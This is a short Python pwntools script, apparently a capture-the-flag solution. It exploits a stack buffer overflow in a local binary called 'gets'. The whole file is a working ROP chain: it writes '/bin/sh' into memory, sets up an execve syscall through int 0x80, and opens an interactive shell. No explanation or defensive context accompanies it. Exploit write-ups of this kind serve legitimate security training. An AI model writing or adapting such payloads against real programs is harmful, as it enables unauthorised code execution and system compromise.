from pwn import *

TARGET_BASE = 0x8048000
DATA = 0x80e9f5c

POP_EAX = TARGET_BASE + 0x701c6
POP_EDX = TARGET_BASE + 0x2702a
MOV_DEDX_EAX = TARGET_BASE + 0xc9db
POP_EDX_ECX_EBX = TARGET_BASE + 0x27050
INT_80 = TARGET_BASE + 0x27630

r = process('./gets')

payload = ''
payload += 'A' * 0x1c
payload += p32(POP_EAX)
payload += '/bin'
payload += p32(POP_EDX)
payload += p32(DATA)
payload += p32(MOV_DEDX_EAX)
payload += p32(POP_EAX)
payload += '/sh\x00'
payload += p32(POP_EDX)
payload += p32(DATA + 4)
payload += p32(MOV_DEDX_EAX)
payload += p32(POP_EAX)
payload += p32(0xb)
payload += p32(POP_EDX_ECX_EBX)
payload += p32(0)
payload += p32(0)
payload += p32(DATA)
payload += p32(INT_80)

r.sendlineafter('GIVE ME YOUR NAME!\n', payload)

r.interactive()
